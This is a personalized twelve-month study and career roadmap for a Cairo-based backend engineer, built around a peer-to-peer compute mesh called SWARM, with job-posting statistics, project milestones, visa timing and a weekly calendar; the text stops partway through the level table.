# 🕸️ SWARM — The Twelve-Month Backend & Distributed Systems Roadmap

## From "backend engineer with one year of experience" → the engineer who gets handed the hardest system in the company

**Built for one person:** Ziad Mostafa Elsaid · Cairo, Egypt · ~1 year at Logic Leap · BSc Management Information Systems · Codeforces 1450 · Python, C++, Go · targeting backend and infrastructure roles at Google, Meta, Amazon, Microsoft, Stripe, Datadog, Cloudflare and their European offices.

**Week 1 begins Monday 2026-09-07. Week 52 ends Sunday 2027-09-05.**

> This is a **training program**, not a reading list. Every topic is entered through a **failure you reproduce before you're allowed the explanation**. Every project has **numeric exit criteria**. Every level ends with an **exam you pass or repeat**. Every claim about the job market carries **its number from a dataset of 569 real job postings**. Every week has a **date**.

---

## 📖 Contents

| # | Section |
|---|---|
| I | [The Four Decisions](#i--the-four-decisions) |
| II | [The Evidence Base — 569 postings, the degree question, the split](#ii--the-evidence-base) |
| III | [The Six Laws](#iii--the-six-laws) |
| IV | [The Learning Loop](#iv--the-learning-loop) |
| V | [The Three Tracks](#v--the-three-tracks) |
| VI | [**The Spine: SWARM**](#vi--the-spine-swarm) |
| VII | [The Eight Flagships](#vii--the-eight-flagship-projects) |
| VIII | [The Level Map](#viii--the-level-map) |
| IX | [Levels 0–12 — the curriculum](#-level-0--machine-memory--measurement) |
| X | [Track F — Fundamentals](#-track-f--the-gap-filling-curriculum) |
| XI | [Track I — The Interview Machine](#-track-i--the-interview-machine) |
| XII | [Track J — Craft, Career & Visibility](#-track-j--craft-career--visibility) |
| XIII | [The 52-Week Calendar](#-the-52-week-calendar) |
| XIV | [Assessment](#-assessment-the-three-proofs) |
| XV | [Tracking & Re-planning](#-tracking--re-planning) |
| XVI | [Résumé & GitHub Translation](#-résumé--github-translation) |
| XVII | [The Complete Library](#-the-complete-library) |
| XVIII | [Project Catalog](#-the-complete-project-catalog) |
| XIX | [Final Readiness Checklist](#-the-final-readiness-checklist) |

---

## I — The Four Decisions

**1. Budget: zero.** Everything runs on free tiers:
- **Oracle Cloud always-free** — 4 ARM Ampere cores / 24GB RAM, **no expiry.** This is SWARM's **bootstrap node, STUN/relay server, and always-on peer.** A peer-to-peer network needs one publicly reachable machine to bootstrap from; this is it, and it is free forever.
- **AWS 12-month free tier** — for the AWS-specific work in Level 8 (33.6% of your target postings).
- **GCP $300 / 90-day credit** — spent in **one planned 72-hour window** in Level 8, running a 200-node mesh at a scale your workstation cannot reach.

**2. Hardware: 64GB+ workstation.** This is what makes SWARM feasible solo: you can run **30–50 real mesh nodes locally** with realistic memory footprints. Without it you'd be simulating everything.

**3. Tier-1 applications open Week 40 (2027-06-07).** Your call, and well-founded: **Google and Meta run 6–12 month cooldowns after a failed loop.** Applying early doesn't cost one attempt, it costs the company for the rest of the year.
*One adjustment that doesn't move that date:* from **Week 30**, 2–3 applications/month to non-target regional companies purely for loop calibration. By Week 40 you'll have had 15–20 real interview rounds before the first application that matters.

**4. Fully mobile.** EU/UK/US pipelines open. **Read this in Week 1, not month 10:**

> **US H-1B cap registration happens once a year, in March.** A June 2027 start misses March 2027. A cap-subject US role then means register March 2028 → lottery → start October 2028. **Europe has no lottery** — Ireland's Critical Skills permit, the EU Blue Card, the Netherlands scheme and the UK Skilled Worker visa are all continuous and reachable in 2027. **EMEA offices are the primary target, not the fallback.** The US is a two-to-three-year move via an EMEA office. *Verify current rules yourself in Week 1.*

**And the Egyptian calendar, budgeted:** **Ramadan 2027 ≈ 8 Feb – 9 Mar** lands on Level 6 → budgeted at 20h/week with scope moved out. **Eid al-Fitr** ≈ Mar 9–11 (Week 27, 26h). **Eid al-Adha** ≈ May 16–19 (Week 37, 26h).

### ⚙️ Scope decision: the two famous courses

**MIT 6.5840 (150–250h) and CMU 15-445 (80–120h) are NOT run as full courses in this plan.** Together they are 230–370h against a total depth budget of 840h. Taking both leaves ~500h — not enough to actually build SWARM, and SWARM is the thing that gets you hired.

**Instead:**
- **Raft is implemented directly as SWARM's region coordinator (~50h, Level 5)**, from the extended paper plus Gjengset's *Students' Guide*, with your own seeded deterministic test harness. You get the artifact without the lab scaffolding.
- **Storage internals come from building `crashdb` (~45h, Level 3)**, with 15-445 lectures 3–7 as *reference material* consulted when you're stuck, not as a course to complete.
- **Optional warm-ups** if you have slack: 6.5840 Lab 2 (KV with at-most-once RPC, 10–15h) in Week 22's buffer; Fly.io Gossip Glomers 1–4 (verified by Maelstrom, ~15h) in Week 21.

> **🔀 THE EXTENDED TRACK.** If you want the full 6.5840 and 15-445 experience, this becomes an **18-month plan**, not 12. The switch: insert 15-445 as a dedicated 3-month block after Level 3, and 6.5840 Labs 1–5 as a dedicated 4-month block replacing Level 5, then resume at Level 6. Everything else — the calendar structure, the tracks, the career timeline — shifts right by six months and applications open at Week 66 instead of Week 40. **Decide this in Week 1 or at the Week-26 half-year gate, not later.** The 12-month version is written below.

---

## II — The Evidence Base

Everything here traces to a dataset collected in **August 2026: 569 verified job postings across 83 companies, 937 distinct named skills.** Where a number isn't stated, no claim is being made. **128 are backend or infrastructure roles** — all percentages are against those.

### The degree question. Settled here. Never raised again.

| Question | Answer | Out of |
|---|---|---|
| Postings requiring a PhD with no stated alternative | **5** (0.9%) | 569 |
| Postings demanding a CS degree specifically, no alternative field, no experience route | **1** (0.18%) | 569 |
| — and that one is | **a student internship** | |

**One posting in 569.** Tier-1 companies are *stricter* about degree language than the rest — **26.7% of tier-1 postings state no degree gate at all, versus 83.1% elsewhere** — which means most tier-1 postings *do* say something. What they say is the equivalent-experience clause. **That clause is the route, and something has to fill it.**

**SWARM is what fills it.** That is its function in this plan. Not passion. It is the artefact that discharges the equivalent-experience clause in 73.3% of tier-1 postings and makes the rest moot. **Zero hours on credential anxiety. Zero hours on certifications that aren't free and incidental.**

### What the 128 backend/infra postings ask for — and where SWARM hits

| Skill | Share | Where SWARM covers it | Strength |
|---|---|---|---|
| **Distributed systems** | **44.5%** | The entire project. DHT, consensus, membership, replication, partial failure | ●●●●● |
| **Python** | **44.5%** | Simulation harness, reputation modelling, benchmarks, AI eval | ●●●● |
| **Go** | **35.9%** | `swarmd` — gossip, wire protocol, coordinator, gateway, dashboard | ●●●●● |
| **AWS** | **33.6%** | Cloud plane, `costwatch`, cross-cloud mesh, S3 artifact mirror | ●●●● |
| **Kubernetes** | **29.7%** | The bootstrap/relay/coordinator plane, and 30-node test meshes | ●●●● |
| **REST/API design** | **27.3%** | Job submission API, tenant API, OpenAPI, versioning | ●●●● |
| **Scalability** | **27.3%** | Mesh scale, admission control, goodput under 5x overload | ●●●●● |
| **GCP** | **25.0%** | The 200-node credit window | ●●● |
| **C++** | **23.4%** | `swarm-core` — storage engine, DHT, content-addressed store, WASM host, wire codec | ●●●●● |
| **CI/CD** | **21.9%** | Pipeline + nightly 10,000-seed simulation | ●●●● |
| **Observability** | **20.3%** | **Mesh-wide telemetry with no central owner — genuinely harder than normal** | ●●●●● |
| **Testing** | **18.8%** | DST, property testing, fuzzing, Byzantine fault injection | ●●●●● |
| **On-call** | **16.4%** | 20+ self-inflicted incidents + `incident-lab` | ●●●● |
| **Networking** | **14.8%** | **Custom wire protocol, NAT traversal, gossip, failure detection** | ●●●●● |
| **Docker** | **14.1%** | Node images, test-mesh orchestration | ●●●● |
| **System design** | **14.1%** | SWARM *is* a system-design answer you lived | ●●●●● |
| **Perf optimisation** | **11.7%** | Hashing, chunking, DHT routing tables, storage engine | ●●●● |
| **Kafka** | **10.9%** | Audit/telemetry plane; outbox from committed Raft assignments | ●●● |
| **Security fundamentals** | **10.9%** | **You execute untrusted code from strangers. This is a security-critical system.** | ●●●●● |
| Algorithms | 7.8% | Consistent hashing, Chord/Kademlia, Merkle DAG, bin packing, chunking | ●●●●● |
| Data structures | 6.2% | Finger tables, tries, heaps, Bloom filters, LSM | ●●●●● |

**SWARM's weakest tie is Kafka (10.9%), and its strongest are the six largest gaps you have.** That's the right shape.

### 🔴 THE SPLIT — the most important paragraph here

SWARM has two halves doing different jobs.

**The algorithmic and correctness core** — DHT routing, consensus, Merkle DAGs, deterministic simulation, Byzantine verification — is the real intellectual content, and it is what you talk about for forty-five minutes. **Graph algorithms are named in 0 of 569 postings.** If your CV said only "I built a DHT," the screen wouldn't read it.

**The operational shell** — running it, sharding it, observing it, deploying it, breaking it, keeping it up — is what the screen reads. Distributed systems 44.5%, scalability 27.3%, Kubernetes 29.7%, AWS 33.6%, observability 20.3%, on-call 16.4%.

**Why build the core at all?** Three honest reasons:
1. **It is the forty-five-minute answer.** "I deployed a service on Kubernetes" is what every candidate says. "Here is why a naive liveness check fails under an asymmetric partition, and here is the seed that reproduces it" is not.
2. **It is the equivalent-experience evidence.** A CS degree *asserts* you can do this. You have no such assertion. A working DHT with a churn benchmark is a stronger assertion because it is checkable.
3. **It's what keeps you going for twelve months.** A year of YAML will not. A plan you abandon in month four delivers nothing.

**The rule: the shell is never optional and never deferred past Level 8.** If the year goes badly, cut algorithmic depth — drop Kademlia, drop the reputation model's second iteration — before you cut the shell.

---

## III — The Six Laws

**1. Failure First.** Every topic opens with **🔥 THE WALL** — a broken system you reproduce. **You may not read the explanation until the failure is on your screen.** Knowledge acquired to resolve a felt confusion is retained permanently; knowledge acquired from a blog post you nodded at is gone in nine days. Interviewers hear the difference instantly.

**2. Measure Everything.** Every project ships **📈 EXIT CRITERIA** with numbers. **A speedup you cannot attribute to a named mechanism is a coincidence.** Every optimisation reports wall time *and* the relevant counter *and* the mechanism — or is marked "unattributed."

**3. Set the target before you measure. Record both numbers.** Every target in this document was written before any measurement existed. Some are wrong. **Record the pre-measurement target and the actual, side by side**, and revise with a written reason. The pattern of how wrong you are becomes `RETROSPECTIVE.md` in Week 51 — a document almost no candidate has.

**4. Write It Down.** Every flagship ships a teardown: problem, options rejected and why, measurements, failure modes, what you'd do at 100x.

**5. Ship Publicly.** Own repo, README with a diagram and a chart in the first screen, `make demo` that works on a clean machine.

**6. Be honest about prior art and about what's simulated.** **BOINC has run volunteer computing in production since 2002 and solved result verification with redundancy and credit.** IPFS solved content addressing. BitTorrent's DHT runs at internet scale. Golem and Akash are commercial compute marketplaces. Ray is a distributed execution engine. **You are not inventing peer-to-peer compute.** Say this first, unprompted, every time. And say plainly that **your mesh is 30–50 nodes you own plus a simulator, not ten thousand strangers' machines.** See §VI.

**You are never allowed to say "unsolved", "first", or "nobody has done this."** State the gap precisely instead — it's a stronger answer and it's the only one that survives an interviewer who knows BOINC exists.

---

## IV — The Learning Loop

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 1. 🔥 BREAK      Reproduce the failure. Make it hurt. Screenshot it.        │
│                  You may not read ahead until it is on your screen.         │
├─────────────────────────────────────────────────────────────────────────────┤
│ 2. 🔎 DIAGNOSE   Write the hypothesis down BEFORE you check. Then           │
│                  instrument: perf, strace, tcpdump, pprof, the simulator.   │
├─────────────────────────────────────────────────────────────────────────────┤
│ 3. 📖 THEORY     NOW read. The chapter answers a question you're holding.   │
├─────────────────────────────────────────────────────────────────────────────┤
│ 4. 🛠 REBUILD    Implement the fix. Then implement the WRONG fix and prove  │
│                  why it's wrong. Both matter.                               │
├─────────────────────────────────────────────────────────────────────────────┤
│ 5. 📈 MEASURE    Before/after. Chart it. Find the NEW bottleneck your fix   │
│                  exposed — there is always one.                             │
├─────────────────────────────────────────────────────────────────────────────┤
│ 6. ✍️ WRITE      3–10 paragraphs: what broke, why, what the numbers said.   │
└─────────────────────────────────────────────────────────────────────────────┘
```

After ~40 of these you stop needing the roadmap. You'll have the reflex of **reproduce → instrument → hypothesise → measure → write.** Everything else is vocabulary.

---

## V — The Three Tracks

```
┌───────────────────────────────────────────────────────────────────────────────┐
│ TRACK D — DEPTH  (58% · 18h/week)                                             │
│ Levels 0–12 + Track F. Builds the engineer. Builds SWARM.                     │
│ Long weekend blocks. Nothing hard is ever built in 45-minute slices.          │
├───────────────────────────────────────────────────────────────────────────────┤
│ TRACK I — INTERVIEW  (24% · 7h/week → 12h from W40)                           │
│ DSA, behavioural, mocks. DAILY from week 1. Never batched. Never skipped.     │
│ Each level names the DSA patterns its systems work reinforces — see §XI.      │
├───────────────────────────────────────────────────────────────────────────────┤
│ TRACK J — CRAFT, CAREER & VISIBILITY  (18% · 5h/week → 6h from W40)           │
│ Design docs, ADRs, writing, OSS, referral pipeline, CV, applications.         │
│ Referral pipeline opens WEEK 18, not week 40. This is why.                    │
└───────────────────────────────────────────────────────────────────────────────┘
```

> **Read twice.** Depth without the interview track means nobody sees the depth — you fail the phone screen and never reach system design. The interview track without depth gets you an L4 offer and a six-year stall. **If you only have one hour on a given day, spend it on Track I** — it's the only track that degrades irreversibly when skipped.

---

## VI — The Spine: SWARM

**One system, built across all thirteen levels, one milestone per level.**

### What it is

**A peer-to-peer distributed compute mesh.** Any machine joins as a node. Every node is simultaneously a **client** (submits jobs) and a **server** (executes jobs submitted by others). There is no central owner. The network cooperatively decides where a job runs, where its code and data live, how they're replicated, what happens when the executing node disappears mid-job — and, the part almost no portfolio project touches, **whether the result a stranger's computer returned is actually correct.**

**The pitch:** *"AWS Lambda where the compute is contributed by the network rather than owned by anyone. I built the scheduler, the storage layer, and the trust model that make that safe — and I measured how much redundancy you actually need to trust a stranger."*

### 🔴 The honesty statement — say this FIRST, every time

> Peer-to-peer distributed compute is not a new idea and I did not invent it. **BOINC** has run volunteer computing in production since 2002 — SETI@home, Folding@home — and it solved the result-verification problem with redundant execution and a credit system. **IPFS** solved content-addressed storage with a Kademlia DHT. **BitTorrent's DHT** runs at internet scale. **Golem and Akash** are commercial compute marketplaces. **Ray** is a mature distributed execution engine. Kubernetes solves the trusted-infrastructure version of the scheduling problem.

**The gaps that are actually real, and each is measurable:**

1. **Nobody publishes the trust/redundancy/cost curve.** BOINC uses redundant execution; the *tradeoff* — how much redundancy buys how much confidence, given a peer's reputation history — is not published as a curve anywhere. **That is measurable, and I measure it.** (Flagship #6.)
2. **Nobody publishes a Chord-vs-Kademlia churn benchmark on one testbed.** Both are famous; hop counts, lookup success rate and maintenance traffic under 10/20/30% simultaneous churn, measured side by side, don't exist publicly. (Flagship #2.)
3. **Deterministic simulation testing with lying nodes as a first-class fault type is rare.** FoundationDB's simulation models crashes, partitions and disk faults — not *nodes that return plausible-but-wrong answers*. That fault type is what SWARM's whole trust layer exists for. (Flagship #4.)
4. **The combination has no open, benchmarked, readable implementation.** BOINC's verification is coupled to scientific-computing workloads; Golem's is coupled to a blockchain; Ray assumes trusted infrastructure.

**The sentence you're allowed to say:** *"Volunteer compute is a solved problem — BOINC has done it for twenty years. What isn't published is the tradeoff curve between redundancy, reputation and trust, and there's no open implementation that measures it. I built one and I have the curve."*

**Never:** "unsolved", "first", "nobody has done this."

### 🔴 The scale statement — the other thing you say unprompted

> **This mesh is 30–50 nodes I run on one workstation, plus one always-free ARM cloud instance as the bootstrap and relay, plus a deterministic simulator that models up to 10,000 nodes.** It has never had ten thousand strangers on it. Everything I measure at real scale is measured in simulation, and the simulator is validated against the real mesh at the sizes where both can run. That validation is in `docs/analysis/sim-fidelity.md`.

**This is a limitation and it is also the reason the simulator exists** — which turns your biggest constraint into your rarest skill. Deterministic simulation testing is used by FoundationDB, TigerBeetle and Antithesis, and almost no candidate has built one.

### Why this is a strong spine: every hard problem is structurally forced

There is no central server to fall back on when you get lazy about consensus, no fixed "the database" to lean on when you get lazy about sharding, and **no way to skip the trust problem**, because the whole premise is running code for strangers on strangers' machines.

| SWARM needs… | …forces you to master | Level |
|---|---|---|
| Running a stranger's code without it eating your machine | **Sandboxing** — WASM, resource metering, syscall isolation, cgroups | 1 |
| Peers finding each other with no directory | **Gossip / SWIM membership**, phi-accrual failure detection | 2 |
| Two home routers letting peers talk | **NAT traversal** — STUN-style hole punching, relay fallback | 2 |
| Code and data surviving on the mesh | **Content-addressed storage**, Merkle DAGs, content-defined chunking, your own storage engine | 3 |
| "Who owns this job?" with no fixed servers | **Consistent hashing, DHTs** — Chord and Kademlia | 4 |
| A region agreeing on assignment without one server | **Raft**, leader election, replicated state machines, fencing | 5 |
| Testing all of the above under simultaneous faults | **Deterministic simulation testing**, including Byzantine faults | 6 |
| An oversubscribed mesh | **Load-aware placement, admission control, backpressure**, goodput | 7 |
| Trusting a stranger's result | **Redundant execution, majority vote, reputation** | 8 |
| Many users sharing the mesh | **Multi-tenancy, quotas, fair queuing, shuffle sharding** | 8 |
| GPU/CPU peers serving models | **AI inference infrastructure** as a job type, not a bolt-on | 9 |
| Keeping it up when you're the only one on call | **Observability without a central owner, chaos, runbooks, SLOs** | 10 |

### Language split — followed exactly

| Language | Owns | Why |
|---|---|---|
| **C++** (`swarm-core`) | The storage engine · content-addressed store + Merkle DAG + chunking · DHT routing tables and lookup · the WASM execution host · the wire codec | This is where the bytes, the hashing and the cache lines are. All performance work lives here. |
| **Go** (`swarmd`) | The node daemon: SWIM gossip · peer wire protocol server · NAT traversal · region coordinator (Raft) · job submission gateway · WebSocket mesh dashboard · admin | Connection handling and concurrent state machines. Go's model is right for this and you'll have the number to prove it. |
| **Python** (`swarmlab`) | Deterministic simulation harness driver · reputation and trust modelling · benchmark analysis and plotting · load generation · AI evaluation | Analysis and experimentation. Fast to iterate, and 44.5% of your target postings name it. |

**The C++/Go boundary:** `swarm-core` is compiled as a **static library with a C ABI**, linked into `swarmd` via cgo for the hot paths (hashing, chunk lookup, DHT table operations), because these are called at high frequency with small payloads and a network hop would dominate. **The WASM executor runs as a separate process** with a pipe protocol, because it runs untrusted code and **must not share a crash or memory domain with the daemon.** That asymmetry — cgo for trusted hot paths, process isolation for untrusted execution — is a real decision with a real security rationale, and it becomes **ADR-0001**.

### The service and component map

| Component | Language | Appears | Purpose |
|---|---|---|---|
| `swarm-core/storage` | C++ | W10 | WAL-backed embedded storage engine |
| `swarm-core/cas` | C++ | W12 | Content-addressed store, Merkle DAG, chunking, GC |
| `swarm-core/dht` | C++ | W14 | Chord and Kademlia routing tables and lookup |
| `swarm-core/codec` | C++ | W5 | Wire protocol encode/decode |
| `swarm-exec` | C++ | W3 | Sandboxed WASM execution host — **separate process** |
| `swarmd/gossip` | Go | W6 | SWIM membership, failure detection |
| `swarmd/transport` | Go | W7 | Peer wire protocol, NAT traversal, relay fallback |
| `swarmd/scheduler` | Go | W27 | Load-aware placement, admission control |
| `swarmd/region` | Go | W19 | Raft region coordinator for job assignment |
| `swarmd/verify` | Go | W31 | Redundant execution, majority vote, reputation |
| `swarmd/gateway` | Go | W8 | Job submission API, OpenAPI, auth, quotas |
| `swarmd/dashboard` | Go | W46 | WebSocket live mesh view |
| `swarmd/admin` | Go | W47 | Ops surface: mesh health, region state, manual eviction |
| `swarm-relay` | Go | W7 | The Oracle-hosted bootstrap + STUN + relay node |
| `swarmlab/sim` | Python+Go | W23 | Deterministic simulation harness |
| `swarmlab/analysis` | Python | W10 | Benchmarks, plots, reputation modelling |
| `llm-peer` | Go+Python | W36 | Inference-capable peer: batching, prefix cache, token accounting |

### The 12 milestones

| # | Level | Week | What you build | The invariant you must prove |
|---|---|---|---|---|
| **S0** | 1 | W4 | Sandboxed WASM executor + durable local job log | A malicious job cannot escape; `kill -9` mid-job leaves a recoverable log, 500 cycles |
| **S1** | 2 | W9 | Peer wire protocol, SWIM gossip, NAT traversal | Two peers behind different NATs discover each other and exchange a job; failure detected within a bounded window with a measured false-positive rate |
| **S2** | 3 | W11 | Hexagonal core with injectable clock, network, storage, sandbox | Full scheduler suite runs in <2s with no real network, disk, sandbox or wall clock |
| **S3** | 3 | W13 | Content-addressed store on your own engine | Identical content → identical address across 10,000 artifacts; tampering detected on retrieval, never silently served |
| **S4** | 4 | W17 | Chord + Kademlia DHT job-ownership routing | Correct lookup under 30% simultaneous churn; O(log N) hops verified empirically at 3 mesh sizes |
| **S5** | 5 | W22 | Raft-coordinated regions over the DHT | Kill a region leader mid-commit under load: **no job assignment lost or double-assigned** |
| **S6** | 6 | W26 | Deterministic simulation with Byzantine faults | 10,000 seeded runs clean; **≥3 real bugs found, each reproducible from a seed integer** |
| **S7** | 7 | W30 | Load-aware placement, admission control, mesh on k8s | Goodput held at 5x offered load via shedding, not collapse |
| **S8** | 8 | W35 | Redundant execution + majority vote + reputation | **A single lying node cannot corrupt an accepted result at N≥3**, proven by an injected fault |
| **S9** | 9 | W39 | Inference peers: the mesh as a model-serving marketplace | Killing the executing peer mid-inference re-routes correctly **without double-billing** |
| **S10** | 10–11 | W47 | Multi-tenancy, dashboard, admin, chaos programme | One tenant at 100x load degrades others' p99 by <10%; 20+ logged incidents with runbooks |
| **S11** | 12 | W52 | Teardown, ADRs, comparison vs BOINC/IPFS/Golem/Ray | A stranger understands the architecture in 15 minutes |

### 🔴 Data and scale strategy — the risk, retired in Week 2

The flight project's biggest risk was data. SWARM's is different: **you have no peers.** Retire it in Week 2, before anything depends on it.

| Layer | What it is | Max realistic scale | Used for |
|---|---|---|---|
| **Local mesh** | Real `swarmd` processes on your workstation, resource-limited | **30–50 nodes** (measure the actual ceiling in W2) | Real protocol behaviour, real NAT-free networking, real storage |
| **Cloud peers** | Oracle always-free ARM (bootstrap/STUN/relay) + AWS t4g | **2–3 nodes, publicly reachable** | Real NAT traversal, real internet latency, real cross-continent |
| **Simulated mesh** | `swarmlab/sim` — seeded, deterministic, no real IO | **10,000 nodes** | Everything at scale: churn, partitions, Byzantine faults, DHT hop counts |
| **GCP burst** | One planned 72-hour window on the $300 credit | **200 real nodes** | Validating the simulator against reality at a scale the workstation can't reach |

**The Week-2 deliverable, `docs/SCALE-RISK.md`:** measure how many `swarmd` nodes actually fit on your machine at realistic memory, what the local network can carry, and **whether NAT traversal works from your Cairo connection to the Oracle box.** Then a signed go/no-go on the simulator-first strategy. **Do not defer this.**

**And the validation that makes the whole thing credible — `docs/analysis/sim-fidelity.md` (Week 34):** run the same experiments on the real 40-node mesh and on a 40-node simulation. **Where do they agree, where do they diverge, and by how much?** Then use the GCP window's 200 real nodes to check whether the divergence grows with scale. **A simulator you haven't validated is a fantasy generator, and this document is what stops yours being one.**

### Non-goals — if you're doing one of these, stop

- **A blockchain, a token, or any cryptocurrency.** Golem and Akash bolt payment onto a chain. You are building the systems half. Billing is an accounting ledger in Postgres. **Adding a chain adds no distributed-systems learning you don't already get from Raft, and it will make some interviewers stop reading.**
- **Real internet-scale deployment.** You will not get ten thousand strangers to run your binary. Say so; use the simulator.
- **Full Byzantine Fault Tolerant consensus (PBFT/Tendermint).** Redundant execution + majority vote is the practical, tractable subset. **Knowing the distinction — and being able to say why you chose the lighter model — is worth more than a half-finished PBFT.**
- **A polished web frontend.** A functional mesh dashboard, yes. A design system, no. Frontend is ~0% of your target postings.
- **A fourth language.** No Rust, no Java, no Scala.
- **Training models.** The AI layer is *serving* infrastructure. Fitting a reputation model is statistics.
- **Publishing a paper.** Write the technical report (W42). Submitting to a venue is off the critical path. If the trust curve is strong, submit in 2028.

---

## VII — The Eight Flagship Projects

### The uniqueness rubric — score before you start. Build only if ≥7/10.

| # | Criterion | Pts | Test |
|---|---|---|---|
| 1 | Non-obvious premise | 2 | Would a bootcamp grad think of this? If yes, 0. |
| 2 | Produces an artifact that doesn't exist yet | 2 | A chart, dataset or comparison someone would cite |
| 3 | Requires a hard idea to be **correct**, not just to run | 2 | Is there an invariant that's easy to violate **silently**? |
| 4 | Demoable in 60 seconds | 1 | One terminal + one graph |
| 5 | Buildable solo in ≤3 weeks | 1 | Ambition that never ships is worth zero |
| 6 | Has a natural "and then it broke" story | 1 | Interview gold |
| 7 | Explainable to a non-specialist in 2 sentences | 1 | If you can't, recruiters can't pass it along |

**The four archetypes:** *Reimplementation with a twist* · *Instrument* (measures what people argue about with no data) · *Autopsy* (reproduce a real failure) · **Adversary** (builds the thing that proves a system wrong). **At least one flagship must be an Adversary — it is the strongest maturity signal a portfolio can carry. SWARM has three.**

| # | Project | Level | Archetype | Score | Pitch | Corpus |
|---|---|---|---|---|---|---|
| 1 | **`crashdb`** | 3 | **Adversary** | 9 | A storage engine — and the torture harness that `kill -9`s it 1,000 times and injects `fsync` failures at the syscall level | Testing 18.8% |
| 2 | **`dht-arena`** | 4 | **Instrument** | 9 | **Chord and Kademlia, both implemented, benchmarked head-to-head under 10/20/30% churn.** Hop counts, lookup success, maintenance traffic. This comparison does not exist publicly. | Distributed 44.5%, Algorithms 7.8% |
| 3 | **`raft`** | 5 | Reimplementation | 8 | Raft from the extended paper, with a seeded deterministic harness making every failure reproducible from an integer | Distributed 44.5% |
| 4 | **`swarmsim`** | 6 | **Adversary** | **10** | Deterministic simulation of the whole mesh — simulated clock, network with asymmetric partitions, disk, scheduler — **and `LyingNode` as a first-class injectable fault.** 10,000 seeds nightly. | Testing 18.8% |
| 5 | **`overload`** | 7 | Instrument | 9 | The goodput-collapse curve: offered load to 5x mesh capacity across six admission strategies, collapse and graceful on the same axes | Scalability 27.3% |
| 6 | **`trustcurve`** | 8 | **Adversary + Instrument** | **10** | **The redundancy/reputation/trust tradeoff curve.** How much redundant execution buys how much confidence, given a peer's history. **The artifact nobody has published.** | Distributed 44.5%, Security 10.9% |
| 7 | **`llm-peer`** | 9 | Reimplementation | 9 | Inference as a mesh job type: capability advertisement, batching, prefix caching, token accounting, streaming through the mesh, **correct re-routing without double-billing when the peer dies mid-generation** | AI infra |
| 8 | **`incident-lab`** | 10 | **Autopsy** | **10** | Eight famous public outages reproduced locally with instrumentation and verified fixes, plus 20 self-inflicted incidents in SWARM | **On-call 16.4%, Observability 20.3%** |

**Core projects** (smaller, closing specific gaps): `latency-lab` (L0) · `c10k-arena` (L2, Networking 14.8%) · `tcpprobe` folded into L2 · `pgshift` (L11, on SWARM's own metadata store) · `gatekeep` (L7, Security 10.9%) · `costwatch` (L8, AWS 33.6%) · `sickbay` (L0, diagnosis under time pressure).

**Worked rubric example — why `trustcurve` scores 10:**

| Criterion | Score | Why |
|---|---|---|
| Non-obvious premise | 2 | "How much redundancy do I need to trust a stranger?" is not a question most engineers have ever been asked |
| Novel artifact | 2 | The curve does not exist publicly. BOINC uses redundancy; nobody publishes the tradeoff. |
| Hard correctness | 2 | **Silently violable** — a trust layer that accepts a wrong result looks identical to one that works |
| Demoable | 1 | One command injects a lying node; one chart shows the curve |
| ≤3 weeks | 1 | Yes, given the simulator already exists |
| Breakage story | 1 | "My first majority-vote implementation accepted a wrong answer at exactly the tie threshold, and TLA+ found it before my tests did" |
| Explainable | 1 | "Measures how many strangers' computers must agree before you can believe the answer" |

---

## VIII — The Level Map

```
              ┌────────────────────────────────────────────────────────────┐
              │ TRACK I — THE INTERVIEW MACHINE                            │
              │ DSA · behavioural · mocks · negotiation                    │
              │ DAILY, W1 → OFFER DAY. Each level names the patterns its   │
              │ systems work reinforces — the tracks compound.             │
              └────────────────────────────────────────────────────────────┘
              ┌────────────────────────────────────────────────────────────┐
              │ TRACK J — CRAFT, CAREER & VISIBILITY                       │
              │ Design docs · ADRs · writing · OSS · referrals · CV        │
              │ REFERRAL PIPELINE OPENS WEEK 18.                           │
              └────────────────────────────────────────────────────────────┘
              ┌────────────────────────────────────────────────────────────┐
              │ TRACK F — FUNDAMENTALS (F1…F16)                            │
              │ Each block lands the week the project first needs it.      │
              └────────────────────────────────────────────────────────────┘

TRACK D — DEPTH:

  L0  Machine, Memory & Measurement ──►  W1–2    Sep 2026
  L1  The Executor: untrusted code  ──►  W3–4    Sep–Oct     S0
  L2  Peer Communication            ──►  W5–9    Oct–Nov     S1
  L3  Storage & Content Addressing  ──►  W10–13  Nov–Dec     S2, S3   ⚑ CV v1
  L4  The DHT                       ──►  W14–17  Dec–Jan     S4
  L5  Consensus: Raft               ──►  W18–22  Jan–Feb     S5
  L6  Correctness: DST + Byzantine  ──►  W23–26  Feb–Mar     S6  ⚑ CV v2  🌙 Ramadan
  L7  Scheduling, Overload & K8s    ──►  W27–30  Mar–Apr     S7
  L8  Trust, Tenancy & Cloud        ──►  W31–35  Apr–May     S8  ⚑ CV v3
  L9  AI Infrastructure             ──►  W36–39  May–Jun     S9
  L10 Operations, Chaos & On-Call   ──►  W40–43  Jun–Jul     ⚑ CV v4  🎯 APPLY
  L11 Platform Completion           ──►  W44–48  Jul–Aug     S10
  L12 Synthesis & Conversion        ──►  W49–52  Aug–Sep     S11
```

| Lvl | Name | Weeks | Dates | Milestone | Flagship | Depth h |
|---|---|---|---|---|---|---|
| **0** | Machine, Memory & Measurement | 1–2 | Sep 7–20 2026 | — | `latency-lab`, `sickbay` | 30 |
| **1** | The Executor: running untrusted code | 3–4 | Sep 21 – Oct 4 | **S0** | — | 45 |
| **2** | Peer Communication | 5–9 | Oct 5 – Nov 8 | **S1** | `c10k-arena` | 90 |
| **3** | Storage & Content Addressing | 10–13 | Nov 9 – Dec 6 | **S2, S3** | **#1 `crashdb`** | 65 |
| **4** | The DHT | 14–17 | Dec 7 – Jan 3 | **S4** | **#2 `dht-arena`** | 72 |
| **5** | Consensus: Raft | 18–22 | Jan 4 – Feb 7 | **S5** | **#3 `raft`** | 90 |
| **6** | Correctness: DST + Byzantine faults | 23–26 | Feb 8 – Mar 7 | **S6** | **#4 `swarmsim`** | 40 🌙 |
| **7** | Scheduling, Overload & Kubernetes | 27–30 | Mar 8 – Apr 4 | **S7** | **#5 `overload`**, `gatekeep` | 70 |
| **8** | Trust, Multi-Tenancy & Cloud | 31–35 | Apr 5 – May 9 | **S8** | **#6 `trustcurve`**, `costwatch` | 90 |
| **9** | AI Infrastructure | 36–39 | May 10 – Jun 6 | **S9** | **#7 `llm-peer`** | 65 |
| **10** | Operations, Chaos & On-Call | 40–43 | Jun 7 – Jul 4 | — | **#8 `incident-lab`** | 48 |
| **11** | Platform Completion | 44–48 | Jul 5 – Aug 8 | **S10** | `pgshift` | 60 |
